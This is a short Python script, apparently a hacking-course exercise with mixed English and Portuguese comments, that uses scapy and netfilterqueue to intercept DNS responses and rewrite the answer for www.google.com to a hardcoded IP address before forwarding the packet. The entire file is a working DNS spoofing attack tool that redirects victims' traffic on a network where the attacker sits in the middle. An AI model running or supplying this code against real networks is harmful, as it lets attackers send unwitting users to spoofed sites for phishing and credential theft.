#from scapy.all import *
#!/usr/bin/env/python
import scapy.all as scapy
import netfilterqueue
# netfilterqueue module used to interact with the queue

# After the queue is created to trap the request & response, accessing this queue...
def process_packet(packet):

    # PEGA PACOTES QUE VAI ENVIAR
    scapy_packet = scapy.IP(packet.get_payload())
    


    ############################################################################
    #                                #CONCEPT                                  #
    #    Forward the request user made to DNS Server, wait for the response    #
    #             Modify IP once the response is obtained                      #
    #                                                                          #
    #                             5H4D0W-R007                                  #
    ############################################################################

    # SE PACOTE FOR DE DNS
    if scapy_packet.haslayer(scapy.DNSRR):

        # PEGA NOME DO DESTINO 'URL'
        qname = scapy_packet[scapy.DNSQR].qname 

        # SE DESTINO FOR OQ QUERO
        if "www.google.com" in qname:
            print("[+] Spoofing target...")
            
            # Create DNSRR[response] with spoofed fields

            # CRIANDO NOVO PARA MASCARAR DNS COM OUTRO IP DESTINO RDATA
            answer = scapy.DNSRR(rrname=qname, rdata="151.101.129.69")

            # ALTERA O QUE SERA ENVIADO
            scapy_packet[scapy.DNS].an = answer #modifying the answer field
            scapy_packet[scapy.DNS].ancount = 1 #hardcoded to a single answer


            # Removing len and checksum fields for IP and UDP layer, scapy will recalculate them for spoofed packet

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            #DEFININDO NOVO PACKET
            packet.set_payload(str(scapy_packet)) #set payload as modified scapy packet
        #print(scapy_packet.show())

    # ENVIA PACKET
    packet.accept() #to forward the packet to dest

queue = netfilterqueue.NetfilterQueue() # instance
queue.bind(0, process_packet) # process_packet -> callback function
# to connect/bind to queue0
queue.run()